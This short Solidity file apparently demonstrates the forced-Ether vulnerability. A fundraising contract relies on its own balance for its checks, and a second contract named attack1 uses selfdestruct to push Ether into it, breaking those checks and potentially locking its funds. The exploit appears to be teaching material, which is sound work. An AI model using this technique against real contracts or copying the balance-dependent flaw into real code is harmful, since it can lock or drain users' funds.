//SPDX-License-Identifier:MIT
pragma solidity 0.8.7;

contract A {

    address public  owner ;

  constructor (address _owner){
      owner = _owner ;
  }

   function  fundrasing() public payable{
    
    require( address(this).balance <= 10000, "Total fund is not more than 10000");
    
   if(address(this).balance >=10000){
      (bool sent, )=owner.call{value:address(this).balance}("");
      require(sent, "Transaciton failed");
   }   
   }


}


contract attack1 {
    

    function attck(address payable _a) public payable{
     selfdestruct(_a); 
    }  
}